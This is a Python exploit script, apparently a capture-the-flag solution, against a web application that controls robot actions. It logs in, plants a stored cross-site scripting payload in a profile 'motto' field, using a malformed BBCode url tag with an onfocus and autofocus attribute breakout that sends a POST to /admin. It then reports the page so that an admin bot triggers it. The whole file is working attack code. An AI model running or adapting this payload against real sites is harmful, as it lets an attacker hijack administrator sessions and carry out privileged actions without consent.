import requests
from pwn import *
from json import loads
from pwn import log
from bs4 import BeautifulSoup
import random
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SCHEMA = args.SCHEMA if args.SCHEMA else "https"
VERIFY_CERTIFICATE = args.VERIFY == "True" if args.VERIFY else True
HOST = args.HOST if args.HOST else "localhost"
PORT = args.PORT if args.PORT else 3000
BASE_URL = f"{SCHEMA}://{HOST}:{PORT}"
USER = args.USER if args.USER else "admin"
PASSWORD = args.PASSWORD if args.PASSWORD else "REDACTED"
# 1 Forward, 2 Backward, 3 Left, 4 Right, 5 Camera
ACTION = args.ACTION if args.ACTION else random.randint(1, 5)
print(VERIFY_CERTIFICATE)

l = log.progress("Expliting XSS")
# Login
l.status(f"Logging in as {USER}:{PASSWORD}")
s = requests.session()
res = s.post(
    f"{BASE_URL}/auth/login",
    json={"username": USER, "password": PASSWORD},
    verify=VERIFY_CERTIFICATE,
)
if not res.ok:
    l.failure("Login failed")
    exit(1)

# Retrieve account id (gets redirected to the right account, we use this to not parse the response)
l.status("Retrieving account id")
res = s.get(f"{BASE_URL}", verify=VERIFY_CERTIFICATE)
soup = BeautifulSoup(res.text, "html.parser")
account_path = soup.findAll("a", {"class": "nav-link"})[0]["href"]

payload = (
    "[url \"\"onfocus=\"fetch('/admin',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'%s'})})\"autofocus]"
    % ACTION
)
l.status(f"Uploading payload to reset action {ACTION}")
res = s.post(f"{BASE_URL}{account_path}/motto", json={"motto": payload}, verify=VERIFY_CERTIFICATE)
if not res.ok:
    l.failure("Payload upload failed")
    exit(1)

# Report to the admin
l.status(f"Sending payload to admin: {BASE_URL}{account_path}")
res = s.post(f"{BASE_URL}/report", json={"url": f"{BASE_URL}{account_path}"}, verify=VERIFY_CERTIFICATE)
if res.ok:
    l.success("Done")
else:
    l.failure("XSS to admin failed")
    exit(2)
